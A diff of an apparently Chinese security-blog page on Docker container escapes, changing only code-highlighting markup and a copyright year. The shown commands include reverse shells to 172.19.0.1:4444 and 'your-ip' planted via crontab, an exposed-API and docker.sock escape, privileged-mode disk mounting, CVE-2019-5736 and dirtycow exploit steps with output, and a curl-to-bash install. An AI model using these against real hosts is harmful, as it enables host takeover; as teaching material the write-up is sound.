@@ -213,11 +213,11 @@ Docker 的安全机制有很多种：Linux Capability、AppArmor、SELinux、Sec
 </span><span class="lnt">4
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="kn">import</span> <span class="nn">docker</span>
-
-<span class="n">client</span> <span class="o">=</span> <span class="n">docker</span><span class="o">.</span><span class="n">DockerClient</span><span class="p">(</span><span class="n">base_url</span><span class="o">=</span><span class="s1">&#39;http://your-ip:2375/&#39;</span><span class="p">)</span>
-<span class="n">data</span> <span class="o">=</span> <span class="n">client</span><span class="o">.</span><span class="n">containers</span><span class="o">.</span><span class="n">run</span><span class="p">(</span><span class="s1">&#39;alpine:latest&#39;</span><span class="p">,</span> <span class="sa">r</span><span class="s1">&#39;&#39;&#39;sh -c &#34;echo &#39;* * * * * /usr/bin/nc your-ip 21 -e /bin/sh&#39; &gt;&gt; /tmp/etc/crontab&#34; &#39;&#39;&#39;</span><span class="p">,</span> <span class="n">remove</span><span class="o">=</span><span class="kc">True</span><span class="p">,</span> <span class="n">volumes</span><span class="o">=</span><span class="p">{</span><span class="s1">&#39;/etc&#39;</span><span class="p">:</span> <span class="p">{</span><span class="s1">&#39;bind&#39;</span><span class="p">:</span> <span class="s1">&#39;/tmp/etc&#39;</span><span class="p">,</span> <span class="s1">&#39;mode&#39;</span><span class="p">:</span> <span class="s1">&#39;rw&#39;</span><span class="p">}})</span>
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">docker</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">client</span> <span class="o">=</span> <span class="n">docker</span><span class="o">.</span><span class="n">DockerClient</span><span class="p">(</span><span class="n">base_url</span><span class="o">=</span><span class="s1">&#39;http://your-ip:2375/&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">data</span> <span class="o">=</span> <span class="n">client</span><span class="o">.</span><span class="n">containers</span><span class="o">.</span><span class="n">run</span><span class="p">(</span><span class="s1">&#39;alpine:latest&#39;</span><span class="p">,</span> <span class="sa">r</span><span class="s1">&#39;&#39;&#39;sh -c &#34;echo &#39;* * * * * /usr/bin/nc your-ip 21 -e /bin/sh&#39; &gt;&gt; /tmp/etc/crontab&#34; &#39;&#39;&#39;</span><span class="p">,</span> <span class="n">remove</span><span class="o">=</span><span class="kc">True</span><span class="p">,</span> <span class="n">volumes</span><span class="o">=</span><span class="p">{</span><span class="s1">&#39;/etc&#39;</span><span class="p">:</span> <span class="p">{</span><span class="s1">&#39;bind&#39;</span><span class="p">:</span> <span class="s1">&#39;/tmp/etc&#39;</span><span class="p">,</span> <span class="s1">&#39;mode&#39;</span><span class="p">:</span> <span class="s1">&#39;rw&#39;</span><span class="p">}})</span>
+</span></span></code></pre></td></tr></table>
 </div>
 </div><h3 id="32-dockersock-挂载到容器内部">3.2 docker.sock 挂载到容器内部</h3>
 <p>场景描述：简单来说就是 docker in docker，在 docker 容器中调用和执行宿主机的 docker，将 docker 宿主机的 docker 文件和 docker.sock 文件挂载到容器中，具体为：</p>
@@ -230,12 +230,12 @@ Docker 的安全机制有很多种：Linux Capability、AppArmor、SELinux、Sec
 </span><span class="lnt">5
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">docker run --rm -it <span class="se">\
-</span><span class="se"></span>  -v /var/run/docker.sock:/var/run/docker.sock <span class="se">\
-</span><span class="se"></span>  -v /usr/bin/docker:/usr/bin/docker <span class="se">\
-</span><span class="se"></span>  ubuntu <span class="se">\
-</span><span class="se"></span>  /bin/bash
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">docker run --rm -it <span class="se">\
+</span></span></span><span class="line"><span class="cl"><span class="se"></span>  -v /var/run/docker.sock:/var/run/docker.sock <span class="se">\
+</span></span></span><span class="line"><span class="cl"><span class="se"></span>  -v /usr/bin/docker:/usr/bin/docker <span class="se">\
+</span></span></span><span class="line"><span class="cl"><span class="se"></span>  ubuntu <span class="se">\
+</span></span></span><span class="line"><span class="cl"><span class="se"></span>  /bin/bash
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>漏洞复现：</p>
 <ol>
@@ -247,9 +247,9 @@ Docker 的安全机制有很多种：Linux Capability、AppArmor、SELinux、Sec
 </span><span class="lnt">2
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">root@95a280bc5a19:/# find / -name docker.sock
-/run/docker.sock
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">root@95a280bc5a19:/# find / -name docker.sock
+</span></span><span class="line"><span class="cl">/run/docker.sock
+</span></span></code></pre></td></tr></table>
 </div>
 </div><ol start="2">
 <li>在容器查看宿主机 docker 信息：</li>
@@ -259,8 +259,8 @@ Docker 的安全机制有很多种：Linux Capability、AppArmor、SELinux、Sec
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">docker -H unix:///var/run/docker.sock info
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">docker -H unix:///var/run/docker.sock info
+</span></span></code></pre></td></tr></table>
 </div>
 </div><ol start="3">
 <li>运行一个新容器并挂载宿主机根路径：</li>
@@ -270,8 +270,8 @@ Docker 的安全机制有很多种：Linux Capability、AppArmor、SELinux、Sec
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">docker -H unix:///var/run/docker.sock run -it -v /:/test ubuntu /bin/bash
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">docker -H unix:///var/run/docker.sock run -it -v /:/test ubuntu /bin/bash
+</span></span></code></pre></td></tr></table>
 </div>
 </div><ol start="4">
 <li>在新容器的 /test 目录下，就可以访问到宿主机的全部资源，接下来就是写入 SSH 密钥或者写入计划任务，获取 shell。</li>
@@ -291,16 +291,16 @@ Docker 的安全机制有很多种：Linux Capability、AppArmor、SELinux、Sec
 </span><span class="lnt">9
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">docker run --rm -it 
-    --privileged 
-    -v /:/soft 
-    --cap-add<span class="o">=</span>SYS_ADMIN 
-    --net<span class="o">=</span>host  
-    --pid<span class="o">=</span>host    
-    --ipc<span class="o">=</span>host 
-    ubuntu 
-    /bin/bash
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">docker run --rm -it 
+</span></span><span class="line"><span class="cl">    --privileged 
+</span></span><span class="line"><span class="cl">    -v /:/soft 
+</span></span><span class="line"><span class="cl">    --cap-add<span class="o">=</span>SYS_ADMIN 
+</span></span><span class="line"><span class="cl">    --net<span class="o">=</span>host  
+</span></span><span class="line"><span class="cl">    --pid<span class="o">=</span>host    
+</span></span><span class="line"><span class="cl">    --ipc<span class="o">=</span>host 
+</span></span><span class="line"><span class="cl">    ubuntu 
+</span></span><span class="line"><span class="cl">    /bin/bash
+</span></span></code></pre></td></tr></table>
 </div>
 </div><h4 id="特权模式---privileged">特权模式 &ndash;privileged</h4>
 <p>使用特权模式启动的容器时，docker 管理员可通过 mount 命令将外部宿主机磁盘设备挂载进容器内部，获取对整个宿主机的文件读写权限，此外还可以通过写入计划任务等方式在宿主机执行命令。</p>
@@ -312,8 +312,8 @@ Docker 的安全机制有很多种：Linux Capability、AppArmor、SELinux、Sec
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">docker run -itd --privileged ubuntu:latest /bin/bash
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">docker run -itd --privileged ubuntu:latest /bin/bash
+</span></span></code></pre></td></tr></table>
 </div>
 </div><ul>
 <li>在容器内，查看磁盘文件：</li>
@@ -323,8 +323,8 @@ Docker 的安全机制有很多种：Linux Capability、AppArmor、SELinux、Sec
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">fdisk -l
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">fdisk -l
+</span></span></code></pre></td></tr></table>
 </div>
 </div><ul>
 <li>将 <code>/dev/sda1</code> 挂载到新建目录</li>
@@ -335,9 +335,9 @@ Docker 的安全机制有很多种：Linux Capability、AppArmor、SELinux、Sec
 </span><span class="lnt">2
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">mkdir /test
-mount /dev/sda1 /test
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">mkdir /test
+</span></span><span class="line"><span class="cl">mount /dev/sda1 /test
+</span></span></code></pre></td></tr></table>
 </div>
 </div><ul>
 <li>将计划任务写入到宿主机</li>
@@ -347,8 +347,8 @@ mount /dev/sda1 /test
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="nb">echo</span> <span class="s1">&#39;* * * * * /bin/bash -i &gt;&amp; /dev/tcp/172.19.0.1/4444 0&gt;&amp;1&#39;</span> &gt;&gt; /test/var/spool/cron/crontabs/root
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s1">&#39;* * * * * /bin/bash -i &gt;&amp; /dev/tcp/172.19.0.1/4444 0&gt;&amp;1&#39;</span> &gt;&gt; /test/var/spool/cron/crontabs/root
+</span></span></code></pre></td></tr></table>
 </div>
 </div><h3 id="34-docker-软件设计引起的逃逸">3.4 Docker 软件设计引起的逃逸</h3>
 <h4 id="341-cve-2019-5736">3.4.1 CVE-2019-5736</h4>
@@ -370,8 +370,8 @@ mount /dev/sda1 /test
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">curl https://gist.githubusercontent.com/thinkycx/e2c9090f035d7b09156077903d6afa51/raw -o install.sh <span class="o">&amp;&amp;</span> bash install.sh
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">curl https://gist.githubusercontent.com/thinkycx/e2c9090f035d7b09156077903d6afa51/raw -o install.sh <span class="o">&amp;&amp;</span> bash install.sh
+</span></span></code></pre></td></tr></table>
 </div>
 </div><ol start="2">
 <li>下载POC，修改脚本，编译</li>
@@ -392,19 +392,19 @@ mount /dev/sda1 /test
 </span><span class="lnt">12
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="c1"># 下载 poc</span>
-git clone https://github.com/Frichetten/CVE-2019-5736-PoC
-
-<span class="c1"># 修改Payload</span>
-vi main.go
-<span class="nv">payload</span> <span class="o">=</span> <span class="s2">&#34;#!/bin/bash \n bash -i &gt;&amp; /dev/tcp/172.19.0.1/4444 0&gt;&amp;1&#34;</span>
-
-<span class="c1"># 编译生成 payload</span>
-<span class="nv">CGO_ENABLED</span><span class="o">=</span><span class="m">0</span> <span class="nv">GOOS</span><span class="o">=</span>linux <span class="nv">GOARCH</span><span class="o">=</span>amd64 go build main.go
-
-<span class="c1"># 拷贝到 docker 容器中执行</span>
-docker cp ./main 248f8b7d3c45:/tmp
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># 下载 poc</span>
+</span></span><span class="line"><span class="cl">git clone https://github.com/Frichetten/CVE-2019-5736-PoC
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># 修改Payload</span>
+</span></span><span class="line"><span class="cl">vi main.go
+</span></span><span class="line"><span class="cl"><span class="nv">payload</span> <span class="o">=</span> <span class="s2">&#34;#!/bin/bash \n bash -i &gt;&amp; /dev/tcp/172.19.0.1/4444 0&gt;&amp;1&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># 编译生成 payload</span>
+</span></span><span class="line"><span class="cl"><span class="nv">CGO_ENABLED</span><span class="o">=</span><span class="m">0</span> <span class="nv">GOOS</span><span class="o">=</span>linux <span class="nv">GOARCH</span><span class="o">=</span>amd64 go build main.go
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># 拷贝到 docker 容器中执行</span>
+</span></span><span class="line"><span class="cl">docker cp ./main 248f8b7d3c45:/tmp
+</span></span></code></pre></td></tr></table>
 </div>
 </div><ol start="3">
 <li>在容器中执行 payload：</li>
@@ -418,12 +418,12 @@ docker cp ./main 248f8b7d3c45:/tmp
 </span><span class="lnt">5
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">root@d1b112ea4a5e:/tmp# ./main
-<span class="o">[</span>+<span class="o">]</span> Overwritten /bin/sh successfully
-<span class="o">[</span>+<span class="o">]</span> Found the PID: <span class="m">16</span>
-<span class="o">[</span>+<span class="o">]</span> Successfully got the file handle
-<span class="o">[</span>+<span class="o">]</span> Successfully got write handle <span class="p">&amp;</span><span class="o">{</span>0xc8201231e0<span class="o">}</span>
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">root@d1b112ea4a5e:/tmp# ./main
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Overwritten /bin/sh successfully
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Found the PID: <span class="m">16</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Successfully got the file handle
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Successfully got write handle <span class="p">&amp;</span><span class="o">{</span>0xc8201231e0<span class="o">}</span>
+</span></span></code></pre></td></tr></table>
 </div>
 </div><ol start="4">
 <li>假设，管理员通过 exec 进入容器，从而触发 Payload。</li>
@@ -433,8 +433,8 @@ docker cp ./main 248f8b7d3c45:/tmp
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">docker <span class="nb">exec</span> -it  cafa20cfb0f9 /bin/sh
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">docker <span class="nb">exec</span> -it  cafa20cfb0f9 /bin/sh
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>在 172.19.0.1 上监听本地端口，成功获取宿主机反弹回来的shell。</p>
 <h4 id="342-cve-2019-14271">3.4.2 CVE-2019-14271</h4>
@@ -451,10 +451,10 @@ docker cp ./main 248f8b7d3c45:/tmp
 </span><span class="lnt">3
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">git clone https://github.com/gebl/dirtycow-docker-vdso.git
-<span class="nb">cd</span> dirtycow-docker-vdso/
-sudo docker-compose run dirtycow /bin/bash
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">git clone https://github.com/gebl/dirtycow-docker-vdso.git
+</span></span><span class="line"><span class="cl"><span class="nb">cd</span> dirtycow-docker-vdso/
+</span></span><span class="line"><span class="cl">sudo docker-compose run dirtycow /bin/bash
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>**漏洞利用：**进入容器，编译 POC 并执行</p>
 <div class="highlight"><div class="chroma">
@@ -464,10 +464,10 @@ sudo docker-compose run dirtycow /bin/bash
 </span><span class="lnt">3
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="nb">cd</span> /dirtycow-vdso/
-make
-./0xdeadbeef 172.19.0.1:4444
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nb">cd</span> /dirtycow-vdso/
+</span></span><span class="line"><span class="cl">make
+</span></span><span class="line"><span class="cl">./0xdeadbeef 172.19.0.1:4444
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p><img
         class="lazyload"
@@ -514,7 +514,7 @@ make
 </div>
 </article></div>
             </main><footer class="footer">
-        <div class="footer-container"><div class="footer-line"><i class="far fa-copyright fa-fw"></i><span itemprop="copyrightYear">2019 - 2021</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank">Geekby</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
+        <div class="footer-container"><div class="footer-line"><i class="far fa-copyright fa-fw"></i><span itemprop="copyrightYear">2019 - 2022</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank">Geekby</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
         </div>
     </footer></div>
 
